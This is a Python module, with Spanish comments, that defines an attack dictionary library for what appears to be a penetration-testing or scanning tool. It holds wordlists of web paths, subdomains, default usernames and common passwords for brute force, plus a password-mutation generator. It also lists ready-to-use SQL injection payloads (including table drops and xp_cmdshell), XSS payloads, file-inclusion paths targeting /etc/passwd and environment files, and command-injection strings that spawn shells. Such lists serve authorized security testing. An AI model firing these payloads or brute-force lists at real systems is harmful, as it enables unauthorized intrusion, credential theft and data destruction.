"""Attack Dictionary Library - Biblioteca de diccionarios de ataques"""

from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
from pathlib import Path


@dataclass
class DictionaryEntry:
    name: str
    description: str
    category: str
    entries: list[str] = field(default_factory=list)
    source: str = "builtin"
    risk_level: int = 0


class AttackDictionary:
    """Biblioteca de diccionarios para ataques"""
    
    DIRECTORIES_COMMON = [
        "admin", "login", "wp-admin", "administrator", "phpmyadmin",
        "backup", "backups", "uploads", "images", "assets", "static",
        "api", "dev", "test", "staging", "prod", "production",
        "cgi-bin", "scripts", "cgi", "perl", "python", "ruby",
        "backup.tar.gz", "backup.zip", "database.sql", "config.php.bak",
        ".git", ".svn", ".env", ".htaccess", "web.config",
        "server-status", "server-info", "server-manager",
        "xmlrpc.php", "wp-login.php", "administrator/index.php",
        "wp-content/uploads", "wp-includes", "wp-json",
        "console", "swagger", "api-docs", "graphql",
        "jmx-console", "hudson", "manage", "manager",
        "portal", "dashboard", "cms", "joomla", "drupal", "wordpress",
        "old", "new", "archive", "tmp", "temp", "cache",
        "logs", "log", "debug", "trace", "monitoring",
        "nginx-status", "apache-status", "status",
        "env.bak", "config.bak", "database.bak",
    ]
    
    SUBDOMAINS_COMMON = [
        "www", "mail", "ftp", "localhost", "webmail", "smtp",
        "pop", "ns1", "webdisk", "ns2", "cpanel", "whm",
        "autodiscover", "autoconfig", "m", "imap", "test",
        "ns", "mail2", "new", "mysql", "old", "lists",
        "support", "dev", "www2", "afp", "news", "forum",
        "blog", "media", "天国", "secure", "admin", "administrator",
        "login", "authenticate", "auth", "gateway", "firewall",
        "router", "modem", "camera", "dvr", "nvr",
        "printer", "scanner", "storage", "nas", "synology",
        "qnap", "dell", "hp", "ibm", "cisco",
        "vpn", "proxy", "cache", "cdn", "static",
        "assets", "static", "images", "img", "video", "videos",
        "download", "downloads", "files", "share", "sharing",
        "cloud", "office", "drive", "dropbox", "box",
        "git", "github", "gitlab", "bitbucket",
        "jenkins", "jira", "confluence", "slack",
        "api", "rest", "soap", "graphql", "swagger",
        "db", "database", "mysql", "postgres", "mongodb",
        "redis", "elasticsearch", "kibana", "grafana",
        "prometheus", "alertmanager", "consul", "nomad",
        "terraform", "ansible", "puppet", "chef",
        "staging", "stage", "preprod", "pre-prod",
        "demo", "sandbox", "lab", "training",
    ]
    
    USERNAMES_COMMON = [
        "admin", "administrator", "root", "user", "guest",
        "test", "testing", "demo", "default", "postgres",
        "mysql", "oracle", "sa", "sys", "system",
        "support", "helpdesk", "service", "services",
        "nagios", "zabbix", "monitoring", "backup",
        "ftp", "ssh", "telnet", "vnc", "rdp",
        "jenkins", "jira", "confluence", "gitlab",
        "tomcat", "jboss", "websphere", "weblogic",
        "apache", "nginx", "www-data", "nobody",
        "backup", "operator", "manager", "supervisor",
        "ubuntu", "centos", "debian", "fedora",
        "oracle", "db2", "informix", "sybase",
        "cisco", "juniper", "fortinet", "pfsense",
    ]
    
    PASSWORDS_COMMON = [
        "admin", "admin123", "administrator", "password", "password123",
        "123456", "12345678", "123456789", "1234567890",
        "qwerty", "abc123", "abcdef", "abcdefgh",
        "letmein", "welcome", "monkey", "dragon",
        "master", "login", "pass", "pass123", "pass1234",
        "root", "toor", "shadow", "default", "null",
        "test", "testing", "demo", "guest", "guest123",
        "changeme", "password1", "Password1", "Password123",
        "P@ssw0rd", "P@ssword", "P@$$w0rd",
        "Summer2024", "Winter2024", "Spring2024", "Autumn2024",
        "Welcome1", "Welcome123", "Welcome2024",
        "January", "February", "March", "April",
        "Monday", "Friday", "Weekend",
        "secret", "secret123", "password!",
        "support", "helpdesk", "service",
        "password!", "password1!", "Admin123!",
        "Server2024", "Server123", "Server!",
        "Qwerty123", "Qwerty!", "asdfgh",
        "zxcvbn", "iloveyou", "trustno1",
    ]
    
    SQL_PAYLOADS = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "' OR '1'='1'/*", "admin' OR '1'='1", "admin' --",
        "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
        "' or 1=1/*", "') or '1'='1", "') or ('1'='1--",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "1' AND SLEEP(5)--", "1' AND (SELECT * FROM users) LIKE '%",
        "1'; DROP TABLE users--", "1'; EXEC xp_cmdshell('dir')--",
        "1' WAITFOR DELAY '00:00:05'--",
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "<scr<script>ipt>alert('XSS')</scr</script>",
        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
    ]
    
    LFI_PATHS = [
        "../../../etc/passwd", "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00", "../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/proc/self/environ", "/proc/1/environ",
        "/var/log/apache2/access.log", "/var/log/nginx/access.log",
        "../../../var/log/auth.log", "../../../../var/log/auth.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "expect://ls", "cgi-data://",
    ]
    
    COMMAND_INJECTION = [
        "; ls -la", "| ls -la", "& ls -la", "&& ls -la",
        "|| ls -la", "; cat /etc/passwd", "| cat /etc/passwd",
        "`whoami`", "$(whoami)", "${whoami}",
        "; id", "| id", "`id`", "$(id)",
        "; uname -a", "| uname -a",
        "; cat /etc/hostname", "| cat /etc/hostname",
        ";/bin/sh", "|/bin/sh", "&/bin/sh",
        "0wn3d", "; echo 0wn3d",
    ]
    
    CVE_SEARCH_PATTERNS = [
        "CVE-2024-", "CVE-2023-", "CVE-2022-", "CVE-2021-",
        "MS17-010", "MS08-067", "MS12-020",
        "Shellshock", "Heartbleed", "POODLE", "DROWN",
        "Log4Shell", "Log4j", "Spring4Shell",
        "ProxyLogon", "ProxyShell", "PrintNightmare",
        "ZeroLogon", "Zerologon", "BlueKeep",
        "EternalBlue", "EternalRomance", "DoublePulsar",
    ]

    def __init__(self):
        self._dictionaries: dict[str, DictionaryEntry] = {}
        self._load_builtin_dictionaries()
    
    def _load_builtin_dictionaries(self) -> None:
        self._dictionaries["directories_common"] = DictionaryEntry(
            name="directories_common",
            description="Directorios web comunes",
            category="web",
            entries=self.DIRECTORIES_COMMON,
            source="builtin"
        )
        
        self._dictionaries["subdomains_common"] = DictionaryEntry(
            name="subdomains_common",
            description="Subdominios comunes",
            category="osint",
            entries=self.SUBDOMAINS_COMMON,
            source="builtin"
        )
        
        self._dictionaries["usernames_common"] = DictionaryEntry(
            name="usernames_common",
            description="Usernames comunes para brute force",
            category="password",
            entries=self.USERNAMES_COMMON,
            source="builtin"
        )
        
        self._dictionaries["passwords_common"] = DictionaryEntry(
            name="passwords_common",
            description="Contraseñas comunes",
            category="password",
            entries=self.PASSWORDS_COMMON,
            risk_level=2
        )
        
        self._dictionaries["sql_payloads"] = DictionaryEntry(
            name="sql_payloads",
            description="Payloads SQL Injection",
            category="injection",
            entries=self.SQL_PAYLOADS,
            risk_level=2
        )
        
        self._dictionaries["xss_payloads"] = DictionaryEntry(
            name="xss_payloads",
            description="Payloads XSS",
            category="web",
            entries=self.XSS_PAYLOADS,
            risk_level=1
        )
        
        self._dictionaries["lfi_paths"] = DictionaryEntry(
            name="lfi_paths",
            description="Rutas LFI comunes",
            category="injection",
            entries=self.LFI_PATHS,
            risk_level=1
        )
        
        self._dictionaries["command_injection"] = DictionaryEntry(
            name="command_injection",
            description="Patrones de inyección de comandos",
            category="injection",
            entries=self.COMMAND_INJECTION,
            risk_level=2
        )
        
        self._dictionaries["cve_patterns"] = DictionaryEntry(
            name="cve_patterns",
            description="Patrones de búsqueda CVE",
            category="intel",
            entries=self.CVE_SEARCH_PATTERNS,
            source="builtin"
        )
    
    def get(self, name: str) -> Optional[DictionaryEntry]:
        return self._dictionaries.get(name)
    
    def list_dictionaries(self) -> list[dict]:
        return [
            {
                "name": d.name,
                "description": d.description,
                "category": d.category,
                "entries": len(d.entries),
                "risk_level": d.risk_level,
                "source": d.source,
            }
            for d in self._dictionaries.values()
        ]
    
    def list_by_category(self, category: str) -> list[DictionaryEntry]:
        return [d for d in self._dictionaries.values() if d.category == category]
    
    def search(self, query: str) -> list[DictionaryEntry]:
        query = query.lower()
        return [
            d for d in self._dictionaries.values()
            if query in d.name.lower() or query in d.description.lower()
        ]
    
    def export_to_file(self, name: str, filepath: str) -> bool:
        entry = self._dictionaries.get(name)
        if not entry:
            return False
        
        try:
            Path(filepath).write_text("\n".join(entry.entries))
            return True
        except Exception:
            return False
    
    def add_custom_dictionary(self, entry: DictionaryEntry) -> None:
        self._dictionaries[entry.name] = entry
    
    def generate_password_mutations(self, base: str) -> list[str]:
        mutations = [base]
        
        mutations.extend([
            base.capitalize(),
            base.upper(),
            base.lower(),
            base + "123",
            base + "123!",
            base + "!",
            base + str(datetime.now().year),
            base + str(datetime.now().year) + "!",
            base[0].upper() + base[1:] + "1",
            base.replace("a", "@").replace("e", "3").replace("i", "1").replace("o", "0"),
        ])
        
        return list(set(mutations))
    
    def get_all_entries_flat(self) -> list[str]:
        all_entries = []
        for d in self._dictionaries.values():
            all_entries.extend(d.entries)
        return all_entries
    
    def get_directories(self) -> list[str]:
        entry = self._dictionaries.get("directories_common")
        return entry.entries if entry else self.DIRECTORIES_COMMON
    
    def get_subdomains(self) -> list[str]:
        entry = self._dictionaries.get("subdomains_common")
        return entry.entries if entry else self.SUBDOMAINS_COMMON
    
    def get_usernames(self) -> list[str]:
        entry = self._dictionaries.get("usernames_common")
        return entry.entries if entry else self.USERNAMES_COMMON
    
    def get_passwords(self) -> list[str]:
        entry = self._dictionaries.get("passwords_common")
        return entry.entries if entry else self.PASSWORDS_COMMON
    
    def get_sql_payloads(self) -> list[str]:
        entry = self._dictionaries.get("sql_payloads")
        return entry.entries if entry else self.SQL_PAYLOADS
    
    def get_xss_payloads(self) -> list[str]:
        entry = self._dictionaries.get("xss_payloads")
        return entry.entries if entry else self.XSS_PAYLOADS
    
    def get_lfi_payloads(self) -> list[str]:
        entry = self._dictionaries.get("lfi_paths")
        return entry.entries if entry else self.LFI_PATHS
    
    def get_cve_patterns(self) -> list[str]:
        entry = self._dictionaries.get("cve_patterns")
        return entry.entries if entry else self.CVE_SEARCH_PATTERNS
    
    def get_all(self) -> list[str]:
        return self.get_all_entries_flat()


GLOBAL_DICTIONARY = AttackDictionary()
